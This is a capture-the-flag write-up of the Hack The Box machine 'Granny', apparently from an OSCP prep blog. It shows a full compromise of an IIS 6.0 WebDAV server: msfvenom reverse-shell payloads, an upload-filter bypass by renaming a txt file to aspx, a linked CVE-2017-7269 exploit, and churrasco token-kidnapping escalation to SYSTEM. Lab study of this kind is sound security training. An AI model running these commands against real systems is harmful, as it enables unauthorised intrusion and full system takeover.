---
title: "Hack The Box - Granny"
date: 2020-01-31
tags: [oscp, htb, windows]
collection: oscp-prep
published: true
layout: single
classes: wide
toc: true
toc_label: Table of Contents
headline: "Exploiting IIS WebDAV and Token Kidnapping (no MSF)"
picture: /assets/htb-granny/machine_info.png
author_profile: false
---

> NOTE: This write-up is part of a set, with the other being [Grandpa](https://dm7500.github.io/oscp-prep/2020-01-30-HTB-Grandpa/). Since the boxes are so similar, but the easy way to root is via Metasploit, I decided to do one with MSF, and one without. Grandpa will be done with Metaspliot, and Granny done without Metasploit, in order to better practice for the OSCP.

![](/assets/htb-granny/machine_info.png)

## Enumeration

Our initial Nmap scans show that only port 80 is open, running IIS 6.0. This means we're looking at a Windows Server 2003 system. Also, note that the `http-webdav-scan` section shows that WebDAV is enabled on the web server, and lists the commands available for us to use.

```
Nmap scan report for 10.10.10.14
Host is up, received user-set (0.053s latency).
Scanned at 2020-01-30 17:13:15 EST for 151s
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Thu, 30 Jan 2020 22:16:22 GMT
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Since we're looking at a WebDAV system, we can use `davtest` to see what we can posibly upload and execute on the server. The `davtest -url http://10.10.10.15` will kick off the script for us. According to the results, we can only *execute* `html` and `txt` files, but can upload executable files like `cfm`, `php`, `pl`, and `jsp`.

![](/assets/htb-granny/davtest.png)

---

## Initial Shell

This box has 2 methods of remote exploitation on WebDAV. One is manual, and more OSCP-like. The other is a cut-and-dry CVE with custom shellcode. I'll cover both here.

### Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow

If you read the Grandpa write-up, you'll see that the Metasploit module we ran exploited a remote buffer overflow in IIS. [We can find the manual version of this exploit here](https://www.exploit-db.com/exploits/41738). However, this code is formatted to only launch calc.exe locally. We can instead use [this exploit](https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell), using the same method as the first. Let's save it locally as `exploit.py`, and run it with `python exploit.py 10.10.10.15 80 10.10.14.35 7500`. Make sure you kick off a listener with `nc -lvnp 7500` before launching the exploit.

<a href="/assets/htb-granny/iis_exploit_shell.png"><img src="/assets/htb-granny/iis_exploit_shell.png" width="95%"></a>

As you can see, we get back the reverse shell!

### WebDAV manual  exploit

The second method we can use for manual exploitation involves using the WebDAV server against itself. 

Before starting, we'll need a custom payload that we can upload to the WebDAV server. The command `msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.35 lport=7500 -f aspx -o shell.aspx` will create a reverse shell payload, in `aspx` format that we can use for exploitation.

We can use the `cadaver` tool to help us upload and move stuff around on the WebDAV server. We can connect with `cadaver http://10.10.10.15`, and type `ls` to view a directory listing.

![](/assets/htb-granny/cadaver_connect.png)

Before we start, let's go over how this will work.

Since we know that the system won't *execute* anything but `html` and `txt`, we need to trick IIS into thinking it's actually a valid file. We can do this by exploiting the ability to `MOVE` and `COPY` the file in WebDAV, which will allow us to rename the extension.

We can upload the shell with cadaver by typing `put shell.aspx`. However, you can see that the system won't accept this.

![](/assets/htb-granny/cadaver_put_aspx_fail.png)

We can use `cp shell.aspx shell.txt` locally to copy the file to plain text, and try uploading it again with cadaver. This time it works.

![](/assets/htb-granny/cadaver_put_txt_good.png)

We can now `MOVE` the file with `move shell.txt shell.aspx`.

![](/assets/htb-granny/cadaver_move.png)

Now start a listener with `nc -lvnp 7500`, and call the script with `curl http://10.10.10.15/shell.aspx`.

<a href="/assets/htb-granny/curl_shell.png"><img src="/assets/htb-granny/curl_shell.png" width="95%"></a>

We got our shell!

## Privilege Escalation

### Enumeration

We should do some basic enumeration of the target, to better see what we can run to grab `SYSTEM`.

The `whoami` and `whoami /priv` commands tell us we're running as `NETWORK SERVICE`, and have the critical `SeImpersonatePrivilege` privilege enabled.

![](/assets/htb-granny/whoami_privs.png)

Running `systeminfo` gives us the below result.

![](/assets/htb-granny/system_info.png)

### Have some churrasco

Seeing that we have the `SeImpersonatePrivilege` privilege enabled on this account is key, as it means that we can probably use a method called *Token HIjacking*. Basically, Server 2003 allows for the `NETWORK SERVICE` and `LOCAL SERVICE` accounts to impersonate the `SYSTEM` account, if this privilege is enabled. [This presentation gives a great breakdown of it in a more technical sense](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf).

The well-known exploit for this attack is called `churrasco.exe`, and can be [found here](https://github.com/Re4son/Churrasco). We can download the `churrasco.exe` locally with `wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe`, and launch an SMB server with `sudo impacket-smbserver kali .`. This SMB server will allow us to easily get the EXE onto the target.

<a href="/assets/htb-granny/wget_smbserver.png"><img src="/assets/htb-granny/wget_smbserver.png" width="95%"></a>

On the target, we need to create the `C:\temp` directory with the below commands. This gives us a writable location to work from.

```shell
cd C:\
mkdir temp
cd temp
```

We can download the file from the SMB server with `copy \\10.10.14.35\kali\churrasco.exe`.

We can run the exploit with `churrasco.exe`, which tells us that the proper usage should be `churrasco.exe -d "command to run"`. We can test this with `churrasco.exe -d "whoami"`, which returns that the command did in fact run as `SYSTEM`.

![](/assets/htb-granny/churrasco_example.png)

Now we just need to use the tool to launch `cmd.exe` as `SYSTEM` with `churrasco.exe -d "cmd.exe"`. As you can see form the results, it's not ideal. It seems we got a single line to run as `SYSTEM`, then it went back to `NETWORK SERVICE`.

![](/assets/htb-granny/churrasco_shell_shaky.png)

To bypass this, we can simply make another `msfvenom` payload as an EXE, transfer it to the target, and ask our exploit to run that as `SYSTEM`.

The payload can be created with `msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.35 lport=7700 -f exe -o revshell.exe`. We can start another listener with `nc -lvnp 7700`, and copy the new payload to the target with our previous SMB server method.

We can run the exploit with `churrasco.exe -d "C:\temp\revshell.exe"` Note that we have to specify the entire path, as `churrasco` tries to look in `C:\WINDOWS\TEMP` by default. As you can see, we get back our `SYSTEM` shell on our listener.

![](/assets/htb-granny/churrasco_revshell.png)

![](/assets/htb-granny/system_shell.png)

All that's left now is to grab flags.

You can find `user.txt` at `C:\Documents and Settings\Lakis\Desktop\user.txt`

![](/assets/htb-granny/user_proof.png)

You can find `root.txt` at `C:\Documents and Settings\Administrator\Desktop\root.txt`

![](/assets/htb-granny/root_proof.png)








